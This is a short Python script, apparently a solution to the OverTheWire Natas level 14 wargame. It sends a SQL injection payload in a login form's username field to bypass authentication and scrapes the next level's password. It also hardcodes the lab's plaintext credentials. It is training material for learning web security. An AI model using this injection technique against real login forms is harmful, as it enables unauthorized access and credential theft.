import requests
import re

def sqli(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    post_data = {
        "username":'natas15" OR "1"="1-- -',
        "password":"whatever"
        }
    sqli_r = requests.post(url,auth=(username,password),data=post_data)
    flag = re.findall("password for natas15 is(.*)<br>",sqli_r.text)
    print("The flag for natas14 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas14.natas.labs.overthewire.org/"
    username = "natas14"
    password = "qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP"
    sqli(url,username,password)